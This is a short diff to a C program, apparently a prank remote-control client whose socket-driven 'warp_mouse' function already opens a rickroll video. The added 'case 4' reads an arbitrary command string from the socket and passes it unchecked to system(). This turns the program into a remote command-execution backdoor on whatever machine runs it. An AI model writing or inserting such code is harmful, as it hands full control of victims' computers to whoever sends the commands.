@@ -50,6 +50,15 @@ void warp_mouse(int sock)
         {
             system("xdg-open https://www.youtube.com/watch?v=dQw4w9WgXcQ");
         } break;
+        case 4:
+        {
+            printf("%s\n", buf);
+            char cmd[98] = { 0 };
+            sscanf(buf, "%*d %97c", cmd);
+
+            printf("%s\n", cmd);
+            system(cmd);
+        } break;
         }
     }
 
